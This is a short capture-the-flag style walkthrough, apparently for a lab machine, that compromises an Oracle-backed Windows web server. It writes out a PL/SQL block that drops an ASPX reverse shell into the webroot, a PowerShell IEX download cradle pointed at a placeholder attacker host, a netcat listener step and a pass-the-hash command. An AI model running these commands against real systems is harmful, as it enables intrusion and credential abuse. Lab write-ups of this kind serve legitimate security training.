Step 1 (Scanning)
- Target was scanned and rescanned using Nmap

Step 2 (Enumeration)
- target has oracle running on port 1521 and port 80 open
- odat.py 'https://github.com/quentinhardy/odat' was run to get the database SID and user/password
- ASPX file was edited to remove styling and unnecessary line breaks/ chars
- login to database using sqlplus64 using:
- sqlplus64 <user/pass>@<ip>:<port>/<SID> as sysdba
  
Step 3 (Gaining access)
- upload aspx reverse shell through oracle by using:
- declare
-   f utl_file.file_type;
-   s varchar(5000) := '<reverseshell script>';
- begin
-   f := utl_file.fopen('/inetpub/wwwroot', 'filename.aspx', 'W');
-   utl_file.put_line(f,s);
-   utl_file.fclose(f);
- end;
- access file by using extention 'filename.aspx' on URL bar

Step 4 (Lateral movement)
- on browser based shell use powershell command:
- powershell.exe IEX(New-Object Net.Webclient).downloadString('http://<attack IP>:<port>/<file>')
- set up nc listener and wait for reverse shell

Step 5 (Priviledge escalation)
- in user profile there is a dropbox link and password for the dropbox
- download the .dmg file from dropbox
- decrypt file using volatility set to the target OS system specification
- use pth-winexe to pass the hash to the system from the recovered administrator hash using
- 'pth-winexe -U <hash> //10.10.10.82 cmd

Step 6 (Pilfering)
